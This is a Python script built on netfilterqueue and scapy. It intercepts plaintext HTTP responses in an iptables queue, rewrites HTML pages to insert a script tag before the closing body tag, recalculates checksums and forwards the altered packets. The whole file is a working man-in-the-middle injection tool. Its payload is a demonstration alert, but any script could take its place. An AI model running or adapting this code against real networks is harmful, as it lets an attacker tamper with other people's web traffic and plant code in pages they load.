import netfilterqueue
import scapy.all as scapy

# Javascript injection string
INJECTION_SCRIPT = b"<script>alert('MitM by Syn-apse!')</script>"

def process_packet(packet):
    """
    This function is called for each packet in the NFQUEUE.
    It checks for HTTP responses and injects a script.
    """
    scapy_packet = scapy.IP(packet.get_payload())

    print(scapy_packet.summary())

    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):

        # Look for HTTP responses coming FROM port 80
        if scapy_packet[scapy.TCP].sport == 80:
            http_load = scapy_packet[scapy.Raw].load
            # Check if it's an HTML page
            if b"</body>" in http_load and b"Content-Type: text/html" in http_load:
                print("[+] HTML Response detected. Injecting script...")
                
                # Replace the closing body tag with our script + the closing tag
                modified_load = http_load.replace(b"</body>", INJECTION_SCRIPT + b"</body>")
                
                # Set the modified load back into the packet
                scapy_packet[scapy.Raw].load = modified_load
                
                # Scapy needs to recalculate checksums and length after modification.
                # Deleting them makes scapy handle it automatically upon conversion to bytes.
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                
                # Set the payload of the original queue packet to our modified packet
                packet.set_payload(bytes(scapy_packet))

    # Forward the packet (whether it was modified or not)
    packet.accept()


def start():
    """
    Starts the packet interception queue.
    """
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet) # Bind to queue 0 and set the callback
    print("[*] Packet modifier started. Waiting for traffic...")
    try:
        queue.run()
    except KeyboardInterrupt:
        print("\n[*] Shutting down packet modifier.")
        queue.unbind()